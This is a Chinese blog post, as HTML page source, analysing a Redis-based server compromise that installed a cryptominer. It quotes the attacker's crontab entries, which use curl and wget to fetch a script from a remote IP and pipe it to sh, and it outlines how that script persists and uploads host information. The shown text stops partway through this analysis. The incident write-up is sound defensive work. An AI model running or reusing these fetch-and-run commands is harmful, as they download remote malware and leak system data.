@@ -1,0 +1,1295 @@
+<!DOCTYPE html>
+<html style="display: none;" lang="zh">
+    <head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <!--
+        © Material Theme
+        https://github.com/viosey/hexo-theme-material
+        Version: 1.5.2 -->
+    <script>
+        window.materialVersion = "1.5.2"
+        // Delete localstorage with these tags
+        window.oldVersion = [
+            'codestartv1',
+            '1.3.4',
+            '1.4.0',
+            '1.4.0b1',
+            '1.5.0'
+        ]
+    </script>
+
+    <!-- dns prefetch -->
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+
+
+
+    <link rel="dns-prefetch" href="https://busuanzi.ibruce.info">
+
+
+
+
+
+
+
+
+
+
+
+
+    <!-- Meta & Info -->
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+    <!-- Title -->
+    
+    <title>
+        
+            区块链太火，小心你的服务器被动挖矿 | 
+        
+        区块链技术指北 | ChainONE 官方博客
+    </title>
+
+    <!-- Favicons -->
+    <link rel="icon shortcut" type="image/ico" href="/img/favicon.ico">
+    <link rel="icon" href="/img/favicon.ico">
+
+    <meta name="format-detection" content="telephone=no">
+    <meta name="description" itemprop="description" content="某日，笔者收到 VPS 服务器 CPU 告警，上服务器一看，有个叫做 gpg-agentd 的进程占用大量的 CPU 资源。接着就是常规的排查，IO 情况、网络流量、内存情况、系统日志、crontab 等。本篇文章从一起服务器被黑事件说起，分析了挖矿脚本、被黑过程，以及从 Redis 、服务器、其他服务、日常用户等方面给出了防御方案。除了 Redis 的未授权访问漏洞，目前主要存在未授权访问漏洞的还有：NFS，Samba，LDAP，Rsync，FTP，GitLab，Jenkins，MongoDB，ZooKeeper，ElasticSearch，Memcache，CouchDB，Docker，Solr，Hadoop，Dubbo 等，安全重于泰山，读者千万不要掉以轻心。">
+    <meta name="keywords" content="区块链, ChainONE,Blockchain,Security">
+    <meta name="theme-color" content="#0097A7">
+
+    <!-- Disable Fucking Bloody Baidu Tranformation -->
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+
+    <!--[if lte IE 9]>
+        <link rel="stylesheet" href="/css/ie-blocker.css">
+
+        
+            <script src="/js/ie-blocker.zhCN.js"></script>
+        
+    <![endif]-->
+
+    <!-- Import lsloader -->
+    <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(a){try{localStorage.removeItem(a)}catch(b){}};lsloader.setLS=function(a,c){try{localStorage.setItem(a,c)}catch(b){}};lsloader.getLS=function(a){var c="";try{c=localStorage.getItem(a)}catch(b){c=""}return c};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var b=[];for(var a=0;a<localStorage.length;a++){b.push(localStorage.key(a))}b.forEach(function(e){var f=lsloader.getLS(e);if(window.oldVersion){var d=window.oldVersion.reduce(function(g,h){return g||f.indexOf("/*"+h+"*/")!==-1},false);if(d){lsloader.removeLS(e)}}})}catch(c){}};lsloader.clean();lsloader.load=function(f,a,b,d){if(typeof b==="boolean"){d=b;b=undefined}d=d||false;b=b||function(){};var e;e=this.getLS(f);if(e&&e.indexOf(versionString)===-1){this.removeLS(f);this.requestResource(f,a,b,d);return}if(e){var c=e.split(versionString)[0];if(c!=a){console.log("reload:"+a);this.removeLS(f);this.requestResource(f,a,b,d);return}e=e.split(versionString)[1];if(d){this.jsRunSequence.push({name:f,code:e});this.runjs(a,f,e)}else{document.getElementById(f).appendChild(document.createTextNode(e));b()}}else{this.requestResource(f,a,b,d)}};lsloader.requestResource=function(b,e,a,c){var d=this;if(c){this.iojs(e,b,function(h,f,g){d.setLS(f,h+versionString+g);d.runjs(h,f,g)})}else{this.iocss(e,b,function(f){document.getElementById(b).appendChild(document.createTextNode(f));d.setLS(b,e+versionString+f)},a)}};lsloader.iojs=function(d,b,g){var a=this;a.jsRunSequence.push({name:b,code:""});try{var f=new XMLHttpRequest();f.open("get",d,true);f.onreadystatechange=function(){if(f.readyState==4){if((f.status>=200&&f.status<300)||f.status==304){if(f.response!=""){g(d,b,f.response);return}}a.jsfallback(d,b)}};f.send(null)}catch(c){a.jsfallback(d,b)}};lsloader.iocss=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.iofonts=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.runjs=function(f,c,e){if(!!c&&!!e){for(var b in this.jsRunSequence){if(this.jsRunSequence[b].name==c){this.jsRunSequence[b].code=e}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var a=document.createElement("script");a.appendChild(document.createTextNode(this.jsRunSequence[0].code));a.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(a);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else{if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var d=this;var a=document.createElement("script");a.src=this.jsRunSequence[0].path;a.type="text/javascript";this.jsRunSequence[0].status="loading";a.onload=function(){d.jsRunSequence.shift();if(d.jsRunSequence.length>0){d.runjs()}};document.body.appendChild(a)}}};lsloader.tagLoad=function(b,a){this.jsRunSequence.push({name:a,code:"",path:b,status:"failed"});this.runjs()};lsloader.jsfallback=function(c,b){if(!!this.jsnamemap[b]){return}else{this.jsnamemap[b]=b}for(var a in this.jsRunSequence){if(this.jsRunSequence[a].name==b){this.jsRunSequence[a].code="";this.jsRunSequence[a].status="failed";this.jsRunSequence[a].path=c}}this.runjs()};lsloader.cssfallback=function(e,c,b){if(!!this.cssnamemap[c]){return}else{this.cssnamemap[c]=1}var d=document.createElement("link");d.type="text/css";d.href=e;d.rel="stylesheet";d.onload=d.onerror=b;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(d,a)};lsloader.runInlineScript=function(c,b){var a=document.getElementById(b).innerText;this.jsRunSequence.push({name:c,code:a});this.runjs()}})();</script>
+
+    <!-- Import queue -->
+    <script>function Queue(){this.dataStore=[];this.offer=b;this.poll=d;this.execNext=a;this.debug=false;this.startDebug=c;function b(e){if(this.debug){console.log("Offered a Queued Function.")}if(typeof e==="function"){this.dataStore.push(e)}else{console.log("You must offer a function.")}}function d(){if(this.debug){console.log("Polled a Queued Function.")}return this.dataStore.shift()}function a(){var e=this.poll();if(e!==undefined){if(this.debug){console.log("Run a Queued Function.")}e()}}function c(){this.debug=true}}var queue=new Queue();</script>
+
+    <!-- Import CSS -->
+    
+        <style id="material_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_css","/css/material.min.css?Z7a72R1E4SxzBKR/WGctOA==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+        <style id="style_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("style_css","/css/style.min.css?MKetZV3cUTfDxvMffaOezg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+
+        
+
+    
+
+    
+
+    <!-- Config CSS -->
+
+<!-- Other Styles -->
+<style>
+  body, html {
+    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
+    overflow-x: hidden !important;
+  }
+  
+  code {
+    font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
+  }
+
+  a {
+    color: #00838F;
+  }
+
+  .mdl-card__media,
+  #search-label,
+  #search-form-label:after,
+  #scheme-Paradox .hot_tags-count,
+  #scheme-Paradox .sidebar_archives-count,
+  #scheme-Paradox .sidebar-colored .sidebar-header,
+  #scheme-Paradox .sidebar-colored .sidebar-badge{
+    background-color: #0097A7 !important;
+  }
+
+  /* Sidebar User Drop Down Menu Text Color */
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
+    color: #0097A7 !important;
+  }
+
+  #post_entry-right-info,
+  .sidebar-colored .sidebar-nav li:hover > a,
+  .sidebar-colored .sidebar-nav li:hover > a i,
+  .sidebar-colored .sidebar-nav li > a:hover,
+  .sidebar-colored .sidebar-nav li > a:hover i,
+  .sidebar-colored .sidebar-nav li > a:focus i,
+  .sidebar-colored .sidebar-nav > .open > a,
+  .sidebar-colored .sidebar-nav > .open > a:hover,
+  .sidebar-colored .sidebar-nav > .open > a:focus,
+  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
+    color: #0097A7 !important;
+  }
+
+  .toTop {
+    background: #757575 !important;
+  }
+
+  .material-layout .material-post>.material-nav,
+  .material-layout .material-index>.material-nav,
+  .material-nav a {
+    color: #757575;
+  }
+
+  #scheme-Paradox .MD-burger-layer {
+    background-color: #757575;
+  }
+
+  #scheme-Paradox #post-toc-trigger-btn {
+    color: #757575;
+  }
+
+  .post-toc a:hover {
+    color: #00838F;
+    text-decoration: underline;
+  }
+
+</style>
+
+
+<!-- Theme Background Related-->
+
+    <style>
+      body{
+        background-color: #F5F5F5;
+      }
+
+      /* blog_info bottom background */
+      #scheme-Paradox .material-layout .something-else .mdl-card__supporting-text{
+        background-color: #fff;
+      }
+    </style>
+
+
+
+
+<!-- Fade Effect -->
+
+    <style>
+      .fade {
+        transition: all 800ms linear;
+        -webkit-transform: translate3d(0,0,0);
+        -moz-transform: translate3d(0,0,0);
+        -ms-transform: translate3d(0,0,0);
+        -o-transform: translate3d(0,0,0);
+        transform: translate3d(0,0,0);
+        opacity: 1;
+      }
+
+      .fade.out{
+        opacity: 0;
+      }
+    </style>
+
+
+<!-- Import Font -->
+<!-- Import Roboto -->
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" rel="stylesheet">
+
+
+<!-- Import Material Icons -->
+
+
+    <style id="material_icons"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_icons","/css/material-icons.css?pqhB/Rd/ab0H2+kZp0RDmw==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+
+
+
+
+    <!-- Import jQuery -->
+    
+        <script>lsloader.load("jq_js","/js/jquery.min.js?qcusAULNeBksqffqUM2+Ig==", true)</script>
+    
+
+    <!-- WebAPP Icons -->
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="application-name" content="区块链技术指北 | ChainONE 官方博客">
+    <meta name="msapplication-starturl" content="https://blog.chainon.io/2018/03/08/blockchain-crack-mining/">
+    <meta name="msapplication-navbutton-color" content="#0097A7">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-title" content="区块链技术指北 | ChainONE 官方博客">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon" href="/img/favicon.ico">
+
+    <!-- Site Verification -->
+    
+    
+
+    <!-- RSS -->
+    
+        
+            <link rel="alternate" type="application/atom+xml" href="atom.xml">
+        
+    
+
+    <!-- The Open Graph protocol -->
+    <meta property="og:url" content="https://blog.chainon.io/2018/03/08/blockchain-crack-mining/">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="区块链太火，小心你的服务器被动挖矿 | 区块链技术指北 | ChainONE 官方博客">
+    <meta property="og:image" content="/img/favicon.ico">
+    <meta property="og:description" content="某日，笔者收到 VPS 服务器 CPU 告警，上服务器一看，有个叫做 gpg-agentd 的进程占用大量的 CPU 资源。接着就是常规的排查，IO 情况、网络流量、内存情况、系统日志、crontab 等。本篇文章从一起服务器被黑事件说起，分析了挖矿脚本、被黑过程，以及从 Redis 、服务器、其他服务、日常用户等方面给出了防御方案。除了 Redis 的未授权访问漏洞，目前主要存在未授权访问漏洞的还有：NFS，Samba，LDAP，Rsync，FTP，GitLab，Jenkins，MongoDB，ZooKeeper，ElasticSearch，Memcache，CouchDB，Docker，Solr，Hadoop，Dubbo 等，安全重于泰山，读者千万不要掉以轻心。">
+    <meta property="og:article:tag" content="Blockchain"> <meta property="og:article:tag" content="Security"> 
+
+    
+        <meta property="article:published_time" content="Thu Mar 08 2018 22:22:22 GMT+0800">
+        <meta property="article:modified_time" content="Tue Jun 23 2020 22:56:52 GMT+0800">
+    
+
+    <!-- The Twitter Card protocol -->
+    <meta name="twitter:card" content="summary_large_image">
+
+    <!-- Add canonical link for SEO -->
+    
+        <link rel="canonical" href="https://blog.chainon.io/2018/03/08/blockchain-crack-mining/index.html">
+    
+
+    <!-- Structured-data for SEO -->
+    
+        
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "mainEntityOfPage": "https://blog.chainon.io/2018/03/08/blockchain-crack-mining/index.html",
+    "headline": "区块链太火，小心你的服务器被动挖矿",
+    "datePublished": "Thu Mar 08 2018 22:22:22 GMT+0800",
+    "dateModified": "Tue Jun 23 2020 22:56:52 GMT+0800",
+    "author": {
+        "@type": "Person",
+        "name": "ChainONE",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/img/avatar.jpg"
+        },
+        "description": "Empower Blockchain."
+    },
+    "publisher": {
+        "@type": "Organization",
+        "name": "区块链技术指北 | ChainONE 官方博客",
+        "logo": {
+            "@type":"ImageObject",
+            "url": "/img/favicon.ico"
+        }
+    },
+    "keywords": ",Blockchain,Security区块链, ChainONE",
+    "description": "某日，笔者收到 VPS 服务器 CPU 告警，上服务器一看，有个叫做 gpg-agentd 的进程占用大量的 CPU 资源。接着就是常规的排查，IO 情况、网络流量、内存情况、系统日志、crontab 等。本篇文章从一起服务器被黑事件说起，分析了挖矿脚本、被黑过程，以及从 Redis 、服务器、其他服务、日常用户等方面给出了防御方案。除了 Redis 的未授权访问漏洞，目前主要存在未授权访问漏洞的还有：NFS，Samba，LDAP，Rsync，FTP，GitLab，Jenkins，MongoDB，ZooKeeper，ElasticSearch，Memcache，CouchDB，Docker，Solr，Hadoop，Dubbo 等，安全重于泰山，读者千万不要掉以轻心。",
+}
+</script>
+
+
+    
+
+    <!-- Analytics -->
+    
+        <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+    ga('create', 'UA-57297247-2', 'auto');ga('send', 'pageview');
+</script>
+    
+    
+    
+
+    <!-- Custom Head -->
+    
+
+</head>
+
+
+    
+        <body id="scheme-Paradox" class="lazy">
+            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
+                
+
+                <!-- Main Container -->
+                <main class="material-layout__content" id="main">
+
+                    <!-- Top Anchor -->
+                    <div id="top"></div>
+
+                    
+                        <!-- Hamburger Button -->
+                        <button class="MD-burger-icon sidebar-toggle">
+                            <span id="MD-burger-id" class="MD-burger-layer"></span>
+                        </button>
+                    
+
+                    <!-- Post TOC -->
+
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+
+    <!-- Left aligned menu below button -->
+    
+    
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00-背景"><span class="post-toc-number">1.</span> <span class="post-toc-text">0x00 背景</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-挖矿脚本分析"><span class="post-toc-number">2.</span> <span class="post-toc-text">0x01 挖矿脚本分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-服务器被黑分析"><span class="post-toc-number">3.</span> <span class="post-toc-text">0x02 服务器被黑分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x03-防御方案"><span class="post-toc-number">4.</span> <span class="post-toc-text">0x03 防御方案</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#3-1-Redis-方面"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">3.1 Redis 方面</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#3-2-服务器方面"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">3.2 服务器方面</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#3-3-其他服务"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">3.3 其他服务</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#3-4-日常用户"><span class="post-toc-number">4.4.</span> <span class="post-toc-text">3.4 日常用户</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x04-小结"><span class="post-toc-number">5.</span> <span class="post-toc-text">0x04 小结</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x05-参考"><span class="post-toc-number">6.</span> <span class="post-toc-text">0x05 参考</span></a></li></ol>
+    </ul>
+    
+
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
+    
+        
+            <!-- Random Thumbnail -->
+            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
+
+    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').addClass('lazy');
+</script>
+
+        
+    
+            <p class="article-headline-p">
+                区块链太火，小心你的服务器被动挖矿
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/img/avatar.jpg" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>ChainONE</strong>
+        <span>3月 08, 2018</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+        <button id="article-functions-qrcode-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">devices other</i>
+    <span class="visuallyhidden">devices other</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
+    <li class="mdl-menu__item">在其它设备中阅读本文章</li>
+    
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPYAAAD2CAAAAADAeSUUAAACzklEQVR42u3aMW4DMQwEQP//00mbxs6SFAybmquMnBNplGJBUo+fK58HNjY2NjY2NjY29keyH/Hz9M/9efv6c/KTCNDaMzY2NvZudrJMTn22fPUQJweEjY2NfSf79XaT8JgcyjwaXx8NNjY2NnZ5mTH4aVGBjY2NjX2I3StpXhcbORUbGxsbu9egydtGecglB3GgEYaNjY29mp0PTT/n81vn29jY2NgfzK4+eYsnCZskqPKrPP/sHBsbG3spuzrETXjPNjq5mpmHLjY2NvZt7N5FnEkxU72UMx8/YGNjY+9mVxs6vfKjOhjIf3fUS8PGxsZex86Hr5OrM9UWVR6fo/k2NjY29peze1dwTg0V8rXyHWJjY2Pfxp4XGNWWU+871TYTNjY29g3seZz0RrCFAW0crv8UJ9jY2NgXs5MBbS+iJkOFvFzBxsbGvofda+Ik36wWP9VVolEENjY29mp2HlpJ5OTg3iWhZuhiY2NjL2WfbQzlT2/1PCBHN5WwsbGxv4qdjGnzyz35hvLLQL0RLzY2NvZt7HyZvISotn56rf/CwBgbGxt7NTsPkknYVDF5aEWRho2Njb2UXY2TXrOpGmnVgic6XGxsbOyl7F44jUqC1tveoWNjY2NjV8exebtqHo3lUMTGxsZeyu4NX3sXbpJDqR79qKmEjY2NvYidfO61/hNkHo29VhQ2Njb2PezeALV6NL1Y6gUhNjY29s3sJEjybc0bVUmRcyDAsLGxsb+QXX16EdUrLfIDLTeVsLGxsRexTw1ck1Hu5BCrza8Dg15sbGzsr2LnoVUdr1aHAacCDBsbG/tOdl4w5Nci8/FD72pm/m/AxsbGxq4OYk+9Tfb2pgDDxsbGXseuBk9v6FstdZp3TrGxsbFXsPPhbm/h6jfzplI0eMDGxsZeze41bvINVX8rf1sYTmNjY2MvZd/zYGNjY2NjY2NjY3/M8wuIljQ2ZdBvPAAAAABJRU5ErkJggg==">
+    
+</ul>
+
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        <a class="post_tag-link" href="/tags/Blockchain/">Blockchain</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/Security/">Security</a>
+    </ul>
+    
+
+    <!-- Share -->
+    
+        <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+        
+            <!-- Busuanzi Views -->
+            <a class="post_share-link" href="#">
+                <li class="mdl-menu__item">
+                    <span id="busuanzi_container_page_pv">
+                        <span id="busuanzi_value_page_pv"></span>&nbsp;浏览量
+                    </span>
+                </li>
+            </a>
+        
+    
+
+    <!-- Share Weibo -->
+    
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=区块链太火，小心你的服务器被动挖矿&url=https://blog.chainon.io/2018/03/08/blockchain-crack-mining/index.html&pic=https://blog.chainon.io/img/favicon.ico&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                分享到微博
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=区块链太火，小心你的服务器被动挖矿&url=https://blog.chainon.io/2018/03/08/blockchain-crack-mining/index.html&via=ChainONE" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.chainon.io/2018/03/08/blockchain-crack-mining/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Facebook
+            </li>
+        </a>
+    
+
+    <!-- Share Google+ -->
+    
+        <a class="post_share-link" href="https://plus.google.com/share?url=https://blog.chainon.io/2018/03/08/blockchain-crack-mining/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Google+
+            </li>
+        </a>
+    
+
+    <!-- Share LinkedIn -->
+    
+        <a class="post_share-link" href="https://www.linkedin.com/shareArticle?mini=true&url=https://blog.chainon.io/2018/03/08/blockchain-crack-mining/index.html&title=区块链太火，小心你的服务器被动挖矿" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 LinkedIn
+            </li>
+        </a>
+    
+
+    <!-- Share QQ -->
+    
+        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=区块链技术指北 | ChainONE 官方博客&title=区块链太火，小心你的服务器被动挖矿&summary=ChainONE, Empower Blockchain. 区块链技术指北，构建优质社区，传播和分享区块链技术，探讨潜在价值，连接技术和商业。&pics=https://blog.chainon.io/img/favicon.ico&url=https://blog.chainon.io/2018/03/08/blockchain-crack-mining/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 QQ
+            </li>
+        </a>
+    
+
+    <!-- Share Telegram -->
+    
+        <a class="post_share-link" href="https://telegram.me/share/url?url=https://blog.chainon.io/2018/03/08/blockchain-crack-mining/index.html&text=区块链太火，小心你的服务器被动挖矿" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Telegram
+            </li>
+        </a>
+    
+</ul>
+
+    
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <p>某日，笔者收到 VPS 服务器 CPU 告警，上服务器一看，有个叫做 gpg-agentd 的进程占用大量的 CPU 资源。接着就是常规的排查，IO 情况、网络流量、内存情况、系统日志、crontab 等。本篇文章从一起服务器被黑事件说起，分析了挖矿脚本、被黑过程，以及从 Redis 、服务器、其他服务、日常用户等方面给出了防御方案。除了 Redis 的未授权访问漏洞，目前主要存在未授权访问漏洞的还有：NFS，Samba，LDAP，Rsync，FTP，GitLab，Jenkins，MongoDB，ZooKeeper，ElasticSearch，Memcache，CouchDB，Docker，Solr，Hadoop，Dubbo 等，安全重于泰山，读者千万不要掉以轻心。<br><a id="more"></a></p>
+<p><code>文/温国兵</code></p>
+<p>这是「区块链技术指北」的第 28 篇文章。</p>
+<blockquote>
+<p>如果对我感兴趣，想和我交流，我的微信号：<strong>Wentasy</strong>，加我时简单介绍下自己，并注明来自「区块链技术指北」。同时我会把你拉入微信群「区块链技术指北」。BTW，李笑来老师也加入了我的知识星球，文末有加入方式。</p>
+</blockquote>
+<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><hr>
+<p>某日，笔者收到 VPS 服务器 CPU 告警，上服务器一看，有个叫做 gpg-agentd 的进程占用大量的 CPU 资源。接着就是常规的排查，IO 情况、网络流量、内存情况、系统日志、crontab 等。当排查到 crontab 时，发现 crontab 有如下的任务：</p>
+<pre><code class="bash">*/5 * * * * curl -fsSL http://84.73.251.157:81/bar.sh | sh
+*/5 * * * * wget -q -O- http://84.73.251.157:81/bar.sh | sh
+</code></pre>
+<p>该服务器提供 Redis 资源供笔者测试使用，明显上面两个定时任务不是笔者创建的。定时任务访问外网服务器，紧急处理有三点，一是确认其他服务是否受到影响，二是注释定时任务，三是临时断外网，处理完之后，再来排查原因。</p>
+<p><img src="https://i.imgur.com/Xf3ZNJY.jpg" alt="2018-03-08-blockchain-crack-mining"></p>
+<blockquote>
+<p>题图来自: © kisspng.com / Anonymous Guy Fawkes mask Gunpowder Plot / kisspng.com</p>
+</blockquote>
+<h2 id="0x01-挖矿脚本分析"><a href="#0x01-挖矿脚本分析" class="headerlink" title="0x01 挖矿脚本分析"></a>0x01 挖矿脚本分析</h2><hr>
+<p>笔者把该 Shell 脚本下载到本地，然后进行分析。该脚本包含以下函数：</p>
+<ul>
+<li>IKILLYOU</li>
+<li>FIRE</li>
+<li>DOWNLOAD</li>
+<li>INFO</li>
+<li>CRON</li>
+<li>CLEAN</li>
+<li>INIT</li>
+<li>ITABLE</li>
+</ul>
+<p>我们 <strong>逐个分析</strong>。IKILLYOU 函数会 kill 掉 ssuspsplk 和 gpg-agentd 进程。CRON 函数会将文首的两个 crontab 写入到 /tmp/.bla.cron 文件，接着清空用户的 crontab，然后将 /tmp/.bla.cron 文件载入到 crontab。FIRE 函数删除掉 6379 端口相关的防火墙，允许本地连接，同时将防火墙配置持久化。INFO 函数用于收集主机信息，包含当前服务器进程、服务器硬件属性、系统内核版本、Linux 发行版本、Linux 发行的详细版本、Linux 标准规范信息、crondb 文件帮助信息（下文还会详细说明这个文件的作用），最后将以上信息上传到 84.73.251.157 指定目录。</p>
